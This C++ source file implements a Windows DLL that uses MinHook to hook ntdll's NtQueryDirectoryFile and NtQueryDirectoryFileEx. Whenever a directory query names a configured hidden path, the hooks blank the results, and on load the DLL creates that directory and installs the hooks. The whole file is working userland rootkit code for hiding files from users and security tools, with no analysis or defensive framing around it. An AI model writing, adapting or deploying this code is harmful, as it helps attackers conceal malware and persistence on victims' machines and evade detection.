#include "config.hpp"

typedef NTSTATUS(WINAPI* PNT_QUERY_DIRECTORY_FILE)(
    HANDLE FileHandle,
    HANDLE Event,
    PVOID ApcRoutine,
    PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID FileInformation,
    ULONG Length,
    FILE_INFORMATION_CLASS FileInformationClass,
    BOOLEAN ReturnSingleEntry,
    PUNICODE_STRING FileName,
    BOOLEAN RestartScan
    );

typedef NTSTATUS(WINAPI* PNT_QUERY_DIRECTORY_FILE_EX)(
    HANDLE FileHandle,
    HANDLE Event,
    PVOID ApcRoutine,
    PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID FileInformation,
    ULONG Length,
    FILE_INFORMATION_CLASS FileInformationClass,
    ULONG QueryFlags,
    PUNICODE_STRING FileName
    );

PNT_QUERY_DIRECTORY_FILE Original_NtQueryDirectoryFile;
PNT_QUERY_DIRECTORY_FILE New_NtQueryDirectoryFile;

PNT_QUERY_DIRECTORY_FILE_EX Original_NtQueryDirectoryFileEx;
PNT_QUERY_DIRECTORY_FILE_EX New_NtQueryDirectoryFileEx;

NTSTATUS WINAPI Hooked_NtQueryDirectoryFile(
    HANDLE FileHandle,
    HANDLE Event,
    PVOID ApcRoutine,
    PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID FileInformation,
    ULONG Length,
    FILE_INFORMATION_CLASS FileInformationClass,
    BOOLEAN ReturnSingleEntry,
    PUNICODE_STRING FileName,
    BOOLEAN RestartScan
)
{
    if (FileName && FileName->Buffer &&
        wcsstr(FileName->Buffer, PathHide) != nullptr)
    {
        RtlZeroMemory(FileInformation, Length);
        return STATUS_NO_MORE_FILES; 
    }

    return Original_NtQueryDirectoryFile(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, ReturnSingleEntry, FileName, RestartScan);
}

NTSTATUS WINAPI Hooked_NtQueryDirectoryFileEx(
    HANDLE FileHandle,
    HANDLE Event,
    PVOID ApcRoutine,
    PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID FileInformation,
    ULONG Length,
    FILE_INFORMATION_CLASS FileInformationClass,
    ULONG QueryFlags,
    PUNICODE_STRING FileName
)
{
    if (FileName && FileName->Buffer &&
        wcsstr(FileName->Buffer, PathHide) != nullptr)
    {
        RtlZeroMemory(FileInformation, Length);
        return STATUS_NO_MORE_FILES; 
    }

    return Original_NtQueryDirectoryFileEx(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, QueryFlags, FileName);
}


bool set_directory_hooks()
{
    HMODULE ntdll = GetModuleHandle(L"ntdll.dll");
    Original_NtQueryDirectoryFile = (PNT_QUERY_DIRECTORY_FILE)GetProcAddress(ntdll, "NtQueryDirectoryFile");

    if (MH_Initialize() != MH_OK) { return false; }

    if (MH_CreateHook(Original_NtQueryDirectoryFile, &Hooked_NtQueryDirectoryFile,
        (LPVOID*)&New_NtQueryDirectoryFile) != MH_OK) {
        return false;
    }

    if (MH_EnableHook(Original_NtQueryDirectoryFile) != MH_OK) { return false; }

    Original_NtQueryDirectoryFileEx = (PNT_QUERY_DIRECTORY_FILE_EX)GetProcAddress(ntdll, "NtQueryDirectoryFileEx");
    if (MH_CreateHook(Original_NtQueryDirectoryFileEx, &Hooked_NtQueryDirectoryFileEx,
        (LPVOID*)&New_NtQueryDirectoryFileEx) != MH_OK) {
        return false;
    }

    if (MH_EnableHook(Original_NtQueryDirectoryFileEx) != MH_OK) { return false; }

    return true;
}

bool CreateDirectoryIfNotExists()
{
    if (CreateDirectory(PathHide, nullptr) || GetLastError() == ERROR_ALREADY_EXISTS)
    {
        return true;
    }
    else
    {
        return false;
    }
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{

    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        CreateDirectoryIfNotExists();
        if (!set_directory_hooks()) {
            return FALSE;
        }
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}